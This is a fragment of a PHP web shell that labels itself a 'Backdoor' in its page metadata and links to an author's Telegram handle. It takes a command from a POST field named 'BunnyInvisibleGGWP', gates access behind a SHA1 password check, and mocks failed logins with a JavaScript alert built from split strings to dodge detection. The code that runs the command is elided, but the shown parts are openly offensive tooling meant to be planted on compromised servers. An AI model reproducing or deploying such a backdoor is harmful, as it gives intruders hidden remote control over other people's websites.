...
if (isset($_POST['BunnyInvisibleGGWP'])) {
    $komendnya = $_POST['BunnyInvisibleGGWP'];
...
if (isset($_POST['OkeyBunny'])) {
    if (SHA1($_POST['BunnymanGas']) == $passwd) {
        ...
        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n F"."ai"."le"."d!"." Go" . " A" . "wa" . "y " . "Yo" . "u " . "No" . "ob" . "!!')".";<"."/s"."cr"."ip"."t>";
    }
}
...
<head>
    ...
    <meta name="description" content="<?=$Bunny_Mini_Name?> Backdoor" />
    ...
    <meta property="og:description" content="<?=$Bunny_Mini_Name?> Backdoor" />
...
<body>
    ...
    <div class="footer uk-margin-large-top uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-nowrap" style="background: var(--gray-950);">
        <div class="footer-content uk-padding-small">
            <span class="font-protest-riot"><font class="font-poppins">&copy;2020 - <?=date("Y");?></font> | <a class="font-rose" href="https://t.me/BunnyInvisible404">./BunnyInvisible404</a></span>
        </div>
    </div>
